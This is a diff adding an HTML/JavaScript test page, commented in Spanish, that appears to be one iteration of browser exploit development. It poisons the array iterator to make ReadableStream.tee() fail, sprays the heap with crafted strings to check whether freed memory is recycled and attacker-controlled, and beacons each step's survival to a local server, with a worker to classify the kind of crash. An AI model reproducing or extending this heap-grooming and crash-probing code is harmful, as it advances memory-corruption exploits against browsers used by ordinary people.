@@ -1,0 +1,96 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v26-seed — press-17: ¿el chunk del tee viene de NUESTRA memoria reciclada? (escalera adaptativa)</title></head>
+<body><pre id="out">FA-v26-seed…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v26-seed — press-17 (escalera adaptativa; regla: máxima info por press,
+ * no-letal primero, armed-N antes de cada fila letal, worker reporta PRIMERO).
+ * Pregunta pivote: press-16 S2 murió CON drain ×4096 → ¿el chunk servido trae
+ * bytes NO-cero = memoria RECICLADA (¡controlable!) o el carrier es otra clase?
+ * Escalera:
+ *   R1: seed CEROS (strings de \0) → si SOBREVIVE: el chunk ES reciclado y
+ *       con bytes cero = falsy-path (HandleTypes.h:36) → reciclaje CONFIRMADO
+ *       y control de bytes CONFIRMADO. Si MUERE: los bytes no son nuestros
+ *       (header del StringImpl u otra clase) → carrier equivocado.
+ *   R2: seed 0x41 (control no-cero) → si MUERE: reciclaje confirmado por el
+ *       contraste (muere con A, vive con \0). Si SOBREVIVE: ni siquiera los
+ *       bytes no-cero llegan al slot → otra cosa.
+ *   R3: seed SMI-shaped (0x0000000100000000 pattern vía pares de chars) →
+ *       si sobrevive: ¿qué adoptó? (observamos el objeto resultante).
+ * Cada rung: armed-RN antes, survivor después. Worker: W1 gates INMEDIATO,
+ * WKHB 2s, WKZ 12s — discrimina VM-kill vs proceso-kill por fila. */
+var RID="v26s"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V26-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v26-seed; dr="+dr+"; rt="+rt+"; W="+(typeof Worker));
+
+/* Worker PRIMERO (reporta antes de cualquier fila letal) */
+var wkSpawn="-";
+try{
+  var wsrc =
+    "try{fetch('/beacon/V26-W1',{method:'POST',body:JSON.stringify({b:'gates: RBC='+(typeof ReadableByteStreamController)+';BYOB='+(typeof ReadableStreamBYOBReader)+';resize='+(typeof ArrayBuffer.prototype.resize)+';transfer='+(typeof ArrayBuffer.prototype.transfer)})}).catch(function(){});}catch(e){}\n"+
+    "setInterval(function(){try{fetch('/beacon/V26-WKHB?x='+Date.now(),{method:'POST',body:'{}'}).catch(function(){});}catch(e){}},2000);\n"+
+    "setTimeout(function(){try{fetch('/beacon/V26-WKZ',{method:'POST',body:JSON.stringify({b:'worker vivo a 12s'})}).catch(function(){});}catch(e){}},12000);\n";
+  var w=new Worker(URL.createObjectURL(new Blob([wsrc],{type:"text/javascript"})));
+  wkSpawn="ok";
+}catch(e){ wkSpawn="E:"+String((e&&e.message)||e).slice(0,40); }
+bk("WK","worker="+wkSpawn);
+
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function poiThrowAt1(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i===1) return {value:t[0],done:false}; throw new Error("SEED-MARK"); }};}; }
+function poiFull(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("SEED-MARK"); }};}; }
+
+var HOLD=[];
+function seedWith(charCode, n){
+  HOLD=[];
+  var unit = String.fromCharCode(charCode);
+  for(var i=0;i<n;i++){ HOLD.push(new Array(105).join(unit)+String.fromCharCode(charCode,(charCode+1)&0xFF)); }
+}
+
+/* S1 — control full-fill (debe sobrevivir) */
+bk("armed-1","control full-fill");
+var s1="-";
+try{ poiFull(); new ReadableStream({}).tee(); s1="no-throw"; rst(); }
+catch(e){ rst(); s1="threw:"+String((e&&e.message)||e).slice(0,30); }
+bk("S1",s1);
+
+/* R1 — seed CEROS + throw-at-1: ¿sobrevive? (reciclaje + bytes-nuestros) */
+bk("armed-R1","seed CEROS x4096 + throw-at-1");
+try{ seedWith(0,4096); }catch(e){}
+var r1="-";
+try{ poiThrowAt1(); new ReadableStream({}).tee(); r1="SURVIVIO"; rst(); }
+catch(e){ rst(); r1="threw-catchable:"+String((e&&e.message)||e).slice(0,30); }
+bk("R1",r1+" (sobrevive=chunk-reciclado-con-ceros CONFIRMADO)");
+
+/* R2 — seed 0x41 + throw-at-1: ¿muere? (contraste: bytes no-cero nuestros) */
+bk("armed-R2","seed 0x41 x4096 + throw-at-1 (si no hay R2-survivor, murio aqui)");
+try{ seedWith(0x41,4096); }catch(e){}
+var r2="-";
+try{ poiThrowAt1(); new ReadableStream({}).tee(); r2="SURVIVIO"; rst(); }
+catch(e){ rst(); r2="threw-catchable:"+String((e&&e.message)||e).slice(0,30); }
+bk("R2-survivor",r2);
+
+/* R3 — seed patrón SMI-ish (bytes 00 00 00 01 00 00 00 00) + throw-at-1 */
+bk("armed-R3","seed SMI-pattern + throw-at-1");
+try{
+  HOLD=[]; var smi=""; /* chars 0,0,0,1 × 2 = los 8 bytes */
+  for(var i=0;i<4096;i++){ HOLD.push(new Array(13).join(smi)+""); }
+}catch(e){}
+var r3="-";
+try{ poiThrowAt1(); var t3=new ReadableStream({}).tee(); r3="SURVIVIO:"+typeof t3[0]+","+typeof t3[1]; rst(); }
+catch(e){ rst(); r3="threw-catchable:"+String((e&&e.message)||e).slice(0,30); }
+bk("R3-survivor",r3);
+
+rst();
+clearInterval(HB);
+bk("Z","FA-v26-seed complete — main VIVA (todas las filas sobrevivieron)");
+})();
+</script></body></html>
